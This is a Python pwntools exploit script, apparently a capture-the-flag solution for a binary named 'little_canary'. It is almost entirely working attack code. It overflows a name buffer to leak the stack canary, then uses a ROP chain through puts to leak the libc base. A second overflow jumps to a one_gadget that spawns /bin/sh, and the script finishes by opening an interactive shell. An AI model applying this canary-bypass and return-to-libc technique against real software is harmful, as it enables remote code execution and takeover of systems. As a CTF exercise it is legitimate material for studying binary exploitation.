#! /usr/bin/python3
from pwn import *
# pyright: reportUndefinedVariable=false

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6')
#libc = ELF('./')
elf = ELF('./little_canary')

#context.log_level = 'debug'
debug = 1

if debug:
    io = process('./little_canary')
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

'''
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL

0xebcf1 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xebcf5 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

'''

one_gadget = [0x50a37, 0xebcf1, 0xebcf5, 0xebcf8]
leak = b'a' * 0x49
io.sendafter(b"What's your name?", leak)
io.recvuntil(b'a' * 0x49)
canary = u64(b'\x00' + io.recv(7))
success("canary --> " + hex(canary))

pop_rdi = 0x0000000000401343 # pop rdi ; ret
pop_rsi_r15 = 0x0000000000401341 # pop rsi ; pop r15 ; ret
ret = 0x000000000040101a # ret

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']


rop = b'a' * 0x48 + p64(canary) + p64(0)
rop += flat(
    pop_rdi, puts_got, puts_plt,
    0x40121F #main
)
io.sendafter(b"I put a canary on my stack!", rop)

io.recvuntil(b"Try to defeat it!")
libc_base = u64(io.recvuntil(b'\n', drop = True) + b'\x00' * 2) - libc.sym['puts']
success("libc_base --> " + hex(libc_base))


io.sendafter(b"What's your name?", leak)

rop2 = b'a' * 0x48 + p64(canary) + p64(0)
rop2 += flat(
    libc_base + one_gadget[0]
)
#p()
io.sendafter(b"I put a canary on my stack!", rop2)

io.interactive()

